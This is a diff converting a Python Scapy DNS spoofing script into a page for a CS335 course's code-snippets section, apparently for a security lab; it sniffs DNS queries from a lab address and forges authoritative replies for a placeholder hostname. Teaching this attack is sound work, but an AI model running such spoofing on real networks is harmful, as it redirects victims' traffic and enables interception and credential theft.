@@ -1,8 +1,17 @@
-#!/usr/bin/python
+---
+layout: default
+course_number: CS335
+title: Code Snippets - Python example
+---
+
+DNS Spoofing
+
+```
+#!/usr/bin/python3
 from scapy.all import *
 
 def spoof_dns(pkt):
-    if(DNS in pkt and 'www.cs335.net' in pkt[DNS].qd.qname):
+    if(DNS in pkt and 'add_host_name_here' in pkt[DNS].qd.qname.decode('utf-8')):
 
         # Swap the source and destination IP address
         ip = IP(dst=pkt[IP].src,
@@ -28,7 +37,7 @@ def spoof_dns(pkt):
         dns = DNS(  id=pkt[DNS].id,
                     qd=pkt[DNS].qd,
                     aa=1,       # Authoritative Answer Flag
-                    rd=0,       # Recursion Desired
+                    rd=0,       # Recursion Desired Flag
                     qdcount=1,  # Question Count
                     qr=1,       # Query/Response Flag
                     ancount=1,  # Answer Record Count
@@ -42,4 +51,5 @@ def spoof_dns(pkt):
 
         spoofpkt.show()
 
-pkt=sniff(filter='udp and (src host 10.0.2.12 and dst port 53)', prn=spoof_dns)
+pkt=sniff(iface='', filter='udp and (src host 10.0.2.12 and dst port 53)', prn=spoof_dns)
+```
